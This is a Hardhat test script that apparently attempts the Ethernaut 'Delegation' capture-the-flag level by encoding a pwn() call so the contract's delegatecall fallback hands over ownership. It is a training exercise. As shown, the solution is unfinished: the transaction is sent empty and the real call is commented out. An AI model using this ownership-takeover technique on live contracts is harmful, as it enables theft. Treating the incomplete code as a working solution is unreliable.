import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
    accounts = await ethers.getSigners();
    [eoa] = accounts;
    const challengeFactory = await ethers.getContractFactory(`Delegation`);
    const challengeAddress = await createChallenge(
        `0x9451961b7Aea1Df57bc20CC68D72f662241b5493`
    );
    challenge = await challengeFactory.attach(challengeAddress);
});

it("solves the challenge", async function () {
    const delegateeAbi = ["function pwn()"];
    let iface = new ethers.utils.Interface(delegateeAbi);
    const data = iface.encodeFunctionData(`pwn`, []);

    tx = await eoa.sendTransaction({});

    // tx = await challenge.fallback({
    //   data,
    // })
    await tx.wait();
});

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
